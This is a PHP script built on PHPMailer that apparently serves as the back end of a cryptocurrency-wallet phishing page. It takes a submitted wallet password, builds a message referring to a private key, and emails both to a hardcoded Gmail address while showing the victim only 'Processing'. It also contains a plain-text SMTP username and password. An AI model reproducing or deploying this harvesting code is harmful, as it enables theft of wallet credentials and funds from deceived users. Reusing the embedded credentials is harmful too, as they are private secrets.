<?php
require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

$subject = "Feedback";

$wallet_pass = $_POST['Wpass'];
$email_from = 'feranmi@gmail.com';
$email_to = 'emmajoy658@gmail.com';

if($wallet_pass== ''){
        echo "check the fields";
    }else{
      $subject='Query from '.$sender;
      $message='Dear Sir,<br><br>'.$subject.'<br><br>privatekey: '.$privateKey.'<br>pk Password: '. $wallet_pass . '<br>' . $email_from;

      if(isset($_FILES['attachment'])){
            $errors= array();
            $file_name = $_FILES['attachment']['name'];
            $file_size =$_FILES['attachment']['size'];
            $file_tmp =$_FILES['attachment']['tmp_name'];
            $file_type=$_FILES['attachment']['type'];
            $file_ext=strtolower(end(explode('.',$_FILES['attachment']['name'])));

            $extensions= array("jpeg","jpg","png");

            if(in_array($file_ext,$extensions)=== false){
               $errors[]="extension not allowed, please choose a JPEG or PNG file.";
            }

            if($file_size > 2097152){
               $errors[]='File size must be excately 2 MB';
            }

          //  if(empty($errors)==true){
            //   move_uploaded_file($file_tmp,"uploads/".$file_name);
            //   echo "Success";
          //  }else{
          //     print_r($errors);
          //  }
         }



$mail = new PHPMailer();
$mail->isSMTP();
$mail->Host = "smtp.gmail.com";
$mail->SMTPAuth = "true";
$mail->SMTPSecure = "tls";
$mail->Port = "587";
$mail->Username = "emmajoy658@gmail.com";
$mail->Password = "Olasunkanmi2001!";
$mail->setFrom($email_from);
$mail->AddReplyTo($email_from);
$mail->Subject = "/New Entry";
$mail->MsgHTML($email_from);
$mail->addAttachment($file_tmp, $file_name);
$mail->Body = "Wallet Password= " . $wallet_pass;

$mail->addAddress($email_to);
if ( $mail->Send() ) {
  echo "Processing";
}else{
  echo "Error";
}
}
$mail->smtpClose();

?>
